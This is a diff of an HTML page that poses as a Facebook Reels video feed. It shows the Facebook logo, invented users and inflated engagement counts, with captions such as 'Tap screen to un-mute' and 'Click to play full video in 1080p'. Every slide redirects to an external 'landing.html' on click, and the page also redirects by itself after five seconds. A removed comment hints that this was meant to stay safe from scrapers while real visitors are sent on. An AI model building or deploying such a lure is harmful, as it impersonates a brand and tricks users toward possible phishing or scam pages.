@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Watch Full HD Video</title>
 
-            <!-- Facebook Open Graph Meta Tags -->
+    <!-- Facebook Open Graph Meta Tags -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://earnbypromotion.github.io/index/">
     <meta property="og:title" content="Watch Full HD Video">
@@ -15,10 +15,6 @@
     <meta property="og:image:type" content="image/png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    
-    
-    
-    
 
     <style>
         * {
@@ -36,20 +32,54 @@
             overflow: hidden;
         }
 
-        .reel-container {
+        /* Fullscreen Reel Container with Vertical Snap Scrolling */
+        .reels-feed {
+            width: 100%;
+            height: 100vh;
+            overflow-y: scroll;
+            scroll-snap-type: y mandatory;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        /* Hide Scrollbar */
+        .reels-feed::-webkit-scrollbar {
+            display: none;
+        }
+        .reels-feed {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        .reel-slide {
             position: relative;
             width: 100%;
             height: 100vh;
+            scroll-snap-align: start;
+            scroll-snap-stop: always;
             display: flex;
             justify-content: center;
             align-items: center;
             background-color: #1a1a1a;
+            cursor: pointer;
         }
 
         .video-placeholder {
             width: 100%;
             height: 100%;
             object-fit: cover;
+        }
+
+        /* Gradient Overlay for Text Readability */
+        .reel-slide::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 40%;
+            background: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
+            z-index: 5;
+            pointer-events: none;
         }
 
         .top-bar {
@@ -65,6 +95,7 @@
             font-size: 24px;
             font-weight: bold;
             color: #1877f2;
+            text-shadow: 0 1px 4px rgba(0,0,0,0.8);
         }
 
         .right-sidebar {
@@ -83,6 +114,7 @@
             flex-direction: column;
             align-items: center;
             font-size: 12px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
         .icon-btn svg {
@@ -90,11 +122,12 @@
             height: 28px;
             fill: #fff;
             margin-bottom: 4px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.6));
         }
 
         .bottom-info {
             position: absolute;
-            bottom: 20px;
+            bottom: 24px;
             left: 16px;
             right: 80px;
             z-index: 10;
@@ -108,22 +141,34 @@
         }
 
         .avatar {
-            width: 36px;
-            height: 36px;
+            width: 38px;
+            height: 38px;
             border-radius: 50%;
-            background-color: #1877f2;
+            overflow: hidden;
+            border: 1.5px solid #fff;
+            flex-shrink: 0;
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
         .username {
             font-weight: 600;
-            font-size: 14px;
+            font-size: 15px;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
         .caption {
-            font-size: 13px;
-            color: #e4e6eb;
+            font-size: 13.5px;
+            color: #f0f2f5;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+            line-height: 1.3;
         }
 
+        /* Animated Center Play Button */
         .loader-overlay {
             position: absolute;
             top: 50%;
@@ -134,99 +179,218 @@
             flex-direction: column;
             align-items: center;
             gap: 12px;
-            cursor: pointer;
+            pointer-events: none;
         }
 
         .play-icon {
-            width: 65px;
-            height: 65px;
-            background: rgba(0, 0, 0, 0.6);
+            width: 68px;
+            height: 68px;
+            background: rgba(0, 0, 0, 0.55);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            border: 2px solid rgba(255, 255, 255, 0.8);
-            animation: pulse 1.5s infinite;
+            border: 2.5px solid rgba(255, 255, 255, 0.9);
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+            animation: pulse 1.4s infinite ease-in-out;
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.12); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.9; }
         }
     </style>
 </head>
 <body>
 
-  <div class="reel-container" onclick="redirectToLanding()">
-    <!-- Reel Background Image -->
-    <img src="https://i.imgur.com/Hm85Hf6.jpg" alt="Facebook Reel" class="video-placeholder">
+    <div class="reels-feed">
 
-    <!-- Top Facebook Bar -->
-    <div class="top-bar">
-      <span class="fb-logo">facebook</span>
-    </div>
+        <!-- REEL 1 -->
+        <div class="reel-slide" onclick="redirectToLanding()">
+            <!-- Aap Yahan Apni Pehli Image Link Dalein -->
+            <img src="https://i.imgur.com/Hm85Hf6.jpg" alt="Facebook Reel 1" class="video-placeholder">
 
-    <!-- Animated Center Play Button -->
-    <div class="loader-overlay">
-      <div class="play-icon">
-        <svg viewBox="0 0 24 24" width="32" height="32" fill="#ffffff">
-          <path d="M8 5v14l11-7z"/>
-        </svg>
-      </div>
-    </div>
-
-    <!-- Right Side Icons -->
-    <div class="right-sidebar">
-      <div class="icon-btn">
-        <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-        <span>312.4K</span>
-      </div>
-      <div class="icon-btn">
-        <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.89 2 2 2h14l4 4-.01-18z"/></svg>
-        <span>4.2K</span>
-      </div>
-      <div class="icon-btn">
-        <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L7.04 8.81C6.5 8.31 5.79 8 5 8c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
-        <span>18.2K</span>
-      </div>
-    </div>
-
-    <!-- Bottom User Details -->
-    <div class="bottom-info">
-      <div class="user-profile">
-        <div class="avatar">
-          <img src="https://i.pravatar.cc/100?img=5" alt="Profile" style="width:100%; height:100%; border-radius:50%; object-fit:cover;">
-        </div>
-        <span class="username">Savannah Watson</span>
-      </div>
-      <p class="caption">Loading full HD video stream player...</p>
-    </div>
-
-  </div>
-    
-
-        <!-- Bottom User Details -->
-        <div class="bottom-info">
-            <div class="user-profile">
-                <div class="avatar"></div>
-                <span class="username">Savannah Watson </span>
+            <div class="top-bar">
+                <span class="fb-logo">facebook</span>
             </div>
-            <p class="caption">Loading full HD video stream player...</p>
+
+            <div class="loader-overlay">
+                <div class="play-icon">
+                    <svg viewBox="0 0 24 24" width="34" height="34" fill="#ffffff">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="right-sidebar">
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    <span>312.4K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.89 2 2 2h14l4 4-.01-18z"/></svg>
+                    <span>4.2K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L7.04 8.81C6.5 8.31 5.79 8 5 8c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+                    <span>18.2K</span>
+                </div>
+            </div>
+
+            <div class="bottom-info">
+                <div class="user-profile">
+                    <div class="avatar">
+                        <img src="https://i.pravatar.cc/100?img=5" alt="Profile 1">
+                    </div>
+                    <span class="username">Savannah Watson</span>
+                </div>
+                <p class="caption">Loading full HD video stream player...</p>
+            </div>
         </div>
+
+        <!-- REEL 2 -->
+        <div class="reel-slide" onclick="redirectToLanding()">
+            <!-- Aap Yahan Apni Doosri Image Link Dalein -->
+            <img src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800" alt="Facebook Reel 2" class="video-placeholder">
+
+            <div class="top-bar">
+                <span class="fb-logo">facebook</span>
+            </div>
+
+            <div class="loader-overlay">
+                <div class="play-icon">
+                    <svg viewBox="0 0 24 24" width="34" height="34" fill="#ffffff">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="right-sidebar">
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    <span>189.2K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.89 2 2 2h14l4 4-.01-18z"/></svg>
+                    <span>2.8K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L7.04 8.81C6.5 8.31 5.79 8 5 8c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+                    <span>9.4K</span>
+                </div>
+            </div>
+
+            <div class="bottom-info">
+                <div class="user-profile">
+                    <div class="avatar">
+                        <img src="https://i.pravatar.cc/100?img=12" alt="Profile 2">
+                    </div>
+                    <span class="username">Alex Morgan</span>
+                </div>
+                <p class="caption">Watch viral clip streaming live right now 🔥</p>
+            </div>
+        </div>
+
+        <!-- REEL 3 -->
+        <div class="reel-slide" onclick="redirectToLanding()">
+            <!-- Aap Yahan Apni Teesri Image Link Dalein -->
+            <img src="https://images.unsplash.com/photo-1579783902614-a3fb3927b675?w=800" alt="Facebook Reel 3" class="video-placeholder">
+
+            <div class="top-bar">
+                <span class="fb-logo">facebook</span>
+            </div>
+
+            <div class="loader-overlay">
+                <div class="play-icon">
+                    <svg viewBox="0 0 24 24" width="34" height="34" fill="#ffffff">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="right-sidebar">
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    <span>540.1K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.89 2 2 2h14l4 4-.01-18z"/></svg>
+                    <span>11.5K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L7.04 8.81C6.5 8.31 5.79 8 5 8c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+                    <span>45.0K</span>
+                </div>
+            </div>
+
+            <div class="bottom-info">
+                <div class="user-profile">
+                    <div class="avatar">
+                        <img src="https://i.pravatar.cc/100?img=33" alt="Profile 3">
+                    </div>
+                    <span class="username">Jessica Miller</span>
+                </div>
+                <p class="caption">Click to play full video in 1080p Quality ✨</p>
+            </div>
+        </div>
+
+        <!-- REEL 4 -->
+        <div class="reel-slide" onclick="redirectToLanding()">
+            <!-- Aap Yahan Apni Chauthi Image Link Dalein -->
+            <img src="https://images.unsplash.com/photo-1550684848-fac1c5b4e853?w=800" alt="Facebook Reel 4" class="video-placeholder">
+
+            <div class="top-bar">
+                <span class="fb-logo">facebook</span>
+            </div>
+
+            <div class="loader-overlay">
+                <div class="play-icon">
+                    <svg viewBox="0 0 24 24" width="34" height="34" fill="#ffffff">
+                        <path d="M8 5v14l11-7z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="right-sidebar">
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                    <span>87.4K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.89 2 2 2h14l4 4-.01-18z"/></svg>
+                    <span>1.2K</span>
+                </div>
+                <div class="icon-btn">
+                    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L7.04 8.81C6.5 8.31 5.79 8 5 8c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
+                    <span>5.1K</span>
+                </div>
+            </div>
+
+            <div class="bottom-info">
+                <div class="user-profile">
+                    <div class="avatar">
+                        <img src="https://i.pravatar.cc/100?img=68" alt="Profile 4">
+                    </div>
+                    <span class="username">David Brown</span>
+                </div>
+                <p class="caption">Tap screen to un-mute and play video player 📽️</p>
+            </div>
+        </div>
+
     </div>
 
-    <!-- User Click Redirection Script -->
+    <!-- Redirection Script -->
     <script>
         function redirectToLanding() {
             window.location.href = "https://earnbypromotion.github.io/index/landing.html";
         }
 
-        // Auto redirect after 4 seconds (Safer for Scrapers)
+        // Auto redirect after 5 seconds if user does not click or scroll
         setTimeout(function() {
             redirectToLanding();
-        }, 4000);
+        }, 5000);
     </script>
 </body>
-                </html>
-                
+    </html>
+    
